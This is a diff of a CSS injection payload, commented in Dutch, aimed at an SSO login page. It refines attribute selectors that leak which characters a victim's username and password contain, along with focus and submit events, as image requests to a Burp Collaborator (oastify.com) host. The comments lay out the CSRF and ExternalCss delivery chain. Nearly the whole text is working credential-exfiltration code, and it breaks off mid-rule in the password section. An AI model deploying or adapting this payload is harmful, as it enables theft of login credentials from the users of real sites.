@@ -5,17 +5,18 @@
    WERKING:
    1. CSRF POST laadt SSO loginpagina met deze CSS
    2. Slachtoffer typt credentials en drukt op Login
-   3. Login faalt → server rendert pagina opnieuw met
+   3. Login faalt -> server rendert pagina opnieuw met
       username in value="..." attribuut van het input veld
-   4. ExternalCss= zit als hidden field in het form →
+   4. ExternalCss= zit als hidden field in het form ->
       deze CSS wordt OPNIEUW geladen
-   5. Nu matchen de attribuut-selectors op de ingevulde
-      username → background-image requests naar Collaborator
-   6. Elke prefix-match triggert exact 1 HTTP request
+   5. Attribuut-selectors matchen op de server-gereflecteerde
+      username -> background-image requests naar Collaborator
+   6. Custom properties + var() zorgen dat MEERDERE selectors
+      tegelijk kunnen triggeren (welke karakters zitten erin)
 */
 
 /* ================================================
-   1. BEVESTIGING: CSS IS GELADEN (page load beacon)
+   1. BEVESTIGING: CSS IS GELADEN
    ================================================ */
 
 body {
@@ -49,179 +50,173 @@ body {
 
 /* ================================================
    3. INTERACTIE TRACKING
-   Detecteert welke velden gebruikt worden
    ================================================ */
 
 input#LogOnName:focus {
-  background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/focus-username') !important;
+  list-style-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/focus-username') !important;
 }
 
 input#Password:focus {
-  background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/focus-password') !important;
+  list-style-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/focus-password') !important;
 }
 
 input[type="submit"]:active, button[type="submit"]:active {
-  background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/submit-clicked') !important;
+  list-style-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/submit-clicked') !important;
 }
 
 /* ================================================
-   4. USERNAME EXFILTRATIE via attribuut-selectors
-   Na mislukte login reflecteert de server de username
-   terug in value="...". Deze selectors matchen op de
-   EERSTE letter(s) en triggeren elk 1 HTTP request.
+   4. USERNAME EXFILTRATIE
+   Custom properties worden per matching karakter
+   gezet. De base-rule consumeert ze allemaal via
+   var() in een multi-layer background-image.
+   Zo triggeren ALLE matchende karakters tegelijk.
    ================================================ */
 
-/* --- Eerste karakter (a-z) --- */
-input#LogOnName[value^="a" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=a') !important; }
-input#LogOnName[value^="b" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=b') !important; }
-input#LogOnName[value^="c" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=c') !important; }
-input#LogOnName[value^="d" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=d') !important; }
-input#LogOnName[value^="e" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=e') !important; }
-input#LogOnName[value^="f" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=f') !important; }
-input#LogOnName[value^="g" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=g') !important; }
-input#LogOnName[value^="h" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=h') !important; }
-input#LogOnName[value^="i" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=i') !important; }
-input#LogOnName[value^="j" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=j') !important; }
-input#LogOnName[value^="k" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=k') !important; }
-input#LogOnName[value^="l" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=l') !important; }
-input#LogOnName[value^="m" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=m') !important; }
-input#LogOnName[value^="n" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=n') !important; }
-input#LogOnName[value^="o" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=o') !important; }
-input#LogOnName[value^="p" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=p') !important; }
-input#LogOnName[value^="q" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=q') !important; }
-input#LogOnName[value^="r" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=r') !important; }
-input#LogOnName[value^="s" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=s') !important; }
-input#LogOnName[value^="t" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=t') !important; }
-input#LogOnName[value^="u" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=u') !important; }
-input#LogOnName[value^="v" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=v') !important; }
-input#LogOnName[value^="w" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=w') !important; }
-input#LogOnName[value^="x" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=x') !important; }
-input#LogOnName[value^="y" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=y') !important; }
-input#LogOnName[value^="z" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=z') !important; }
+/* "Bevat karakter" detectie via [value*="x"] */
+input#LogOnName[value*="a" i] { --a: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=a'); }
+input#LogOnName[value*="b" i] { --b: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=b'); }
+input#LogOnName[value*="c" i] { --c: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=c'); }
+input#LogOnName[value*="d" i] { --d: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=d'); }
+input#LogOnName[value*="e" i] { --e: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=e'); }
+input#LogOnName[value*="f" i] { --f: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=f'); }
+input#LogOnName[value*="g" i] { --g: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=g'); }
+input#LogOnName[value*="h" i] { --h: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=h'); }
+input#LogOnName[value*="i" i] { --i: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=i'); }
+input#LogOnName[value*="j" i] { --j: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=j'); }
+input#LogOnName[value*="k" i] { --k: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=k'); }
+input#LogOnName[value*="l" i] { --l: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=l'); }
+input#LogOnName[value*="m" i] { --m: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=m'); }
+input#LogOnName[value*="n" i] { --n: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=n'); }
+input#LogOnName[value*="o" i] { --o: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=o'); }
+input#LogOnName[value*="p" i] { --p: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=p'); }
+input#LogOnName[value*="q" i] { --q: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=q'); }
+input#LogOnName[value*="r" i] { --r: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=r'); }
+input#LogOnName[value*="s" i] { --s: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=s'); }
+input#LogOnName[value*="t" i] { --t: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=t'); }
+input#LogOnName[value*="u" i] { --u: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=u'); }
+input#LogOnName[value*="v" i] { --v: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=v'); }
+input#LogOnName[value*="w" i] { --w: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=w'); }
+input#LogOnName[value*="x" i] { --x: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=x'); }
+input#LogOnName[value*="y" i] { --y: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=y'); }
+input#LogOnName[value*="z" i] { --z: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=z'); }
+input#LogOnName[value*="0"]   { --n0: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=0'); }
+input#LogOnName[value*="1"]   { --n1: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=1'); }
+input#LogOnName[value*="2"]   { --n2: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=2'); }
+input#LogOnName[value*="3"]   { --n3: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=3'); }
+input#LogOnName[value*="4"]   { --n4: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=4'); }
+input#LogOnName[value*="5"]   { --n5: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=5'); }
+input#LogOnName[value*="6"]   { --n6: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=6'); }
+input#LogOnName[value*="7"]   { --n7: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=7'); }
+input#LogOnName[value*="8"]   { --n8: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=8'); }
+input#LogOnName[value*="9"]   { --n9: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=9'); }
+input#LogOnName[value*="@"]   { --at: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=at'); }
+input#LogOnName[value*="."]   { --dot: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=dot'); }
+input#LogOnName[value*="-"]   { --dash: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=dash'); }
+input#LogOnName[value*="_"]   { --under: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?c=under'); }
 
-/* --- Eerste karakter (0-9) --- */
-input#LogOnName[value^="0"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=0') !important; }
-input#LogOnName[value^="1"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=1') !important; }
-input#LogOnName[value^="2"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=2') !important; }
-input#LogOnName[value^="3"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=3') !important; }
-input#LogOnName[value^="4"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=4') !important; }
-input#LogOnName[value^="5"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=5') !important; }
-input#LogOnName[value^="6"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=6') !important; }
-input#LogOnName[value^="7"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=7') !important; }
-input#LogOnName[value^="8"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=8') !important; }
-input#LogOnName[value^="9"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=9') !important; }
+/* Base-rule: consumeert alle custom properties.
+   Alleen properties die daadwerkelijk gezet zijn door
+   een matchende selector worden gefetcht.
+   Niet-matchende vallen terug op none (geen request). */
+input#LogOnName {
+  background-image:
+    var(--a, none), var(--b, none), var(--c, none), var(--d, none),
+    var(--e, none), var(--f, none), var(--g, none), var(--h, none),
+    var(--i, none), var(--j, none), var(--k, none), var(--l, none),
+    var(--m, none), var(--n, none), var(--o, none), var(--p, none),
+    var(--q, none), var(--r, none), var(--s, none), var(--t, none),
+    var(--u, none), var(--v, none), var(--w, none), var(--x, none),
+    var(--y, none), var(--z, none),
+    var(--n0, none), var(--n1, none), var(--n2, none), var(--n3, none),
+    var(--n4, none), var(--n5, none), var(--n6, none), var(--n7, none),
+    var(--n8, none), var(--n9, none),
+    var(--at, none), var(--dot, none), var(--dash, none), var(--under, none) !important;
+  background-repeat: no-repeat !important;
+  background-position: -9999px -9999px !important;
+}
 
 /* ================================================
-   5. USERNAME: KARAKTER-VOOR-KARAKTER EXFILTRATIE
-   Gebruikt list-style-image, border-image, etc. als
-   extra kanalen zodat meerdere selectors tegelijk
-   kunnen matchen (background-image is er maar 1 per
-   element, maar we combineren properties).
+   5. PASSWORD EXFILTRATIE
+   Zelfde techniek. Werkt als de server het wacht-
+   woord teruggeeft in het value attribuut.
    ================================================ */
 
-/* --- Bevat karakter (a-z) via ~= of *= --- */
-input#LogOnName[value*="a" i] { --ca: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?a'); }
-input#LogOnName[value*="b" i] { --cb: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?b'); }
-input#LogOnName[value*="c" i] { --cc: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?c'); }
-input#LogOnName[value*="d" i] { --cd: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?d'); }
-input#LogOnName[value*="e" i] { --ce: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?e'); }
-input#LogOnName[value*="f" i] { --cf: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?f'); }
-input#LogOnName[value*="g" i] { --cg: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?g'); }
-input#LogOnName[value*="h" i] { --ch: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?h'); }
-input#LogOnName[value*="i" i] { --ci: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?i'); }
-input#LogOnName[value*="j" i] { --cj: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?j'); }
-input#LogOnName[value*="k" i] { --ck: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?k'); }
-input#LogOnName[value*="l" i] { --cl: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?l'); }
-input#LogOnName[value*="m" i] { --cm: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?m'); }
-input#LogOnName[value*="n" i] { --cn: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?n'); }
-input#LogOnName[value*="o" i] { --co: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?o'); }
-input#LogOnName[value*="p" i] { --cp: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?p'); }
-input#LogOnName[value*="q" i] { --cq: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?q'); }
-input#LogOnName[value*="r" i] { --cr: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?r'); }
-input#LogOnName[value*="s" i] { --cs: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?s'); }
-input#LogOnName[value*="t" i] { --ct: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?t'); }
-input#LogOnName[value*="u" i] { --cu: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?u'); }
-input#LogOnName[value*="v" i] { --cv: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?v'); }
-input#LogOnName[value*="w" i] { --cw: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?w'); }
-input#LogOnName[value*="x" i] { --cx: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?x'); }
-input#LogOnName[value*="y" i] { --cy: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?y'); }
-input#LogOnName[value*="z" i] { --cz: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?z'); }
-input#LogOnName[value*="0"]   { --c0: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?0'); }
-input#LogOnName[value*="1"]   { --c1: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?1'); }
-input#LogOnName[value*="2"]   { --c2: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?2'); }
-input#LogOnName[value*="3"]   { --c3: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?3'); }
-input#LogOnName[value*="4"]   { --c4: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?4'); }
-input#LogOnName[value*="5"]   { --c5: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?5'); }
-input#LogOnName[value*="6"]   { --c6: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?6'); }
-input#LogOnName[value*="7"]   { --c7: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?7'); }
-input#LogOnName[value*="8"]   { --c8: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?8'); }
-input#LogOnName[value*="9"]   { --c9: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?9'); }
-input#LogOnName[value*="@"]   { --cat: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?at'); }
-input#LogOnName[value*="."]   { --cdt: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?dot'); }
-input#LogOnName[value*="-"]   { --cda: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?dash'); }
-input#LogOnName[value*="_"]   { --cun: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?under'); }
+input#Password[value*="a" i] { --pa: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=a'); }
+input#Password[value*="b" i] { --pb: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=b'); }
+input#Password[value*="c" i] { --pc: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=c'); }
+input#Password[value*="d" i] { --pd: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=d'); }
+input#Password[value*="e" i] { --pe: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=e'); }
+input#Password[value*="f" i] { --pf: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=f'); }
+input#Password[value*="g" i] { --pg: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=g'); }
+input#Password[value*="h" i] { --ph: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=h'); }
+input#Password[value*="i" i] { --pi: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=i'); }
+input#Password[value*="j" i] { --pj: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=j'); }
+input#Password[value*="k" i] { --pk: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=k'); }
+input#Password[value*="l" i] { --pl: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=l'); }
+input#Password[value*="m" i] { --pm: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=m'); }
+input#Password[value*="n" i] { --pn: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=n'); }
+input#Password[value*="o" i] { --po: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=o'); }
+input#Password[value*="p" i] { --pp: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=p'); }
+input#Password[value*="q" i] { --pq: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=q'); }
+input#Password[value*="r" i] { --pr: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=r'); }
+input#Password[value*="s" i] { --ps: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=s'); }
+input#Password[value*="t" i] { --pt: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=t'); }
+input#Password[value*="u" i] { --pu: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=u'); }
+input#Password[value*="v" i] { --pv: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=v'); }
+input#Password[value*="w" i] { --pw: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=w'); }
+input#Password[value*="x" i] { --px: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=x'); }
+input#Password[value*="y" i] { --py: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=y'); }
+input#Password[value*="z" i] { --pz: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=z'); }
+input#Password[value*="0"]   { --p0: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=0'); }
+input#Password[value*="1"]   { --p1: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=1'); }
+input#Password[value*="2"]   { --p2: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=2'); }
+input#Password[value*="3"]   { --p3: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=3'); }
+input#Password[value*="4"]   { --p4: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=4'); }
+input#Password[value*="5"]   { --p5: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=5'); }
+input#Password[value*="6"]   { --p6: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=6'); }
+input#Password[value*="7"]   { --p7: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=7'); }
+input#Password[value*="8"]   { --p8: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=8'); }
+input#Password[value*="9"]   { --p9: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=9'); }
+input#Password[value*="!"]   { --pex: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=bang'); }
+input#Password[value*="@"]   { --pat: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=at'); }
+input#Password[value*="#"]   { --phash: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=hash'); }
+input#Password[value*="$"]   { --pdol: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=dollar'); }
+input#Password[value*="."]   { --pdot: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=dot'); }
+input#Password[value*="-"]   { --pdash: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=dash'); }
+input#Password[value*="_"]   { --punder: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?c=under'); }
 
-/* ================================================
-   6. PASSWORD EXFILTRATIE via attribuut-selectors
-   Werkt alleen als de server het wachtwoord terug-
-   geeft in het value attribuut (ongebruikelijk maar
-   komt voor bij sommige frameworks).
-   ================================================ */
-
-/* --- Eerste karakter --- */
-input#Password[value^="a" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=a') !important; }
-input#Password[value^="b" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=b') !important; }
-input#Password[value^="c" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=c') !important; }
-input#Password[value^="d" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=d') !important; }
-input#Password[value^="e" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=e') !important; }
-input#Password[value^="f" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=f') !important; }
-input#Password[value^="g" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=g') !important; }
-input#Password[value^="h" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=h') !important; }
-input#Password[value^="i" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=i') !important; }
-input#Password[value^="j" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=j') !important; }
-input#Password[value^="k" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=k') !important; }
-input#Password[value^="l" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=l') !important; }
-input#Password[value^="m" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=m') !important; }
-input#Password[value^="n" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=n') !important; }
-input#Password[value^="o" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=o') !important; }
-input#Password[value^="p" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=p') !important; }
-input#Password[value^="q" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=q') !important; }
-input#Password[value^="r" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=r') !important; }
-input#Password[value^="s" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=s') !important; }
-input#Password[value^="t" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=t') !important; }
-input#Password[value^="u" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=u') !important; }
-input#Password[value^="v" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=v') !important; }
-input#Password[value^="w" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=w') !important; }
-input#Password[value^="x" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=x') !important; }
-input#Password[value^="y" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=y') !important; }
-input#Password[value^="z" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=z') !important; }
-input#Password[value^="0"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=0') !important; }
-input#Password[value^="1"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=1') !important; }
-input#Password[value^="2"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=2') !important; }
-input#Password[value^="3"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=3') !important; }
-input#Password[value^="4"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=4') !important; }
-input#Password[value^="5"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=5') !important; }
-input#Password[value^="6"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=6') !important; }
-input#Password[value^="7"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=7') !important; }
-input#Password[value^="8"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=8') !important; }
-input#Password[value^="9"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=9') !important; }
+input#Password {
+  background-image:
+    var(--pa, none), var(--pb, none), var(--pc, none), var(--pd, none),
